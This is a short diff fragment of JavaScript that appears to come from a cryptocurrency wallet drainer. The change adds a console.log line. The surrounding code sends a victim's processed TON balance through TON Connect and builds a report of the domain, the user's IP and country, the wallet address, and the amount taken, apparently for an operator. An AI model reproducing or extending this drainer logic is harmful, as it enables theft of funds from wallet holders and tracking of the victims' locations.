@@ -57,6 +57,7 @@ async function didtrans() {
             amount: processedBalance
         }, ]
     }
+    console.log(transaction);
     try {
         const result = await tonConnectUI.sendTransaction(transaction);
         const messageSend = `\uD83D\uDDC4*Domain:* ${domain}\n\uD83D\uDCBB*User:* ${ipUser} ${countryUser}\n\uD83D\uDCC0*Wallet:* [Ton Scan](https://tonscan.org/address/${tonConnectUI.account.address})\n\n\uD83D\uDC8E*Send:* ${tgBalance}`;
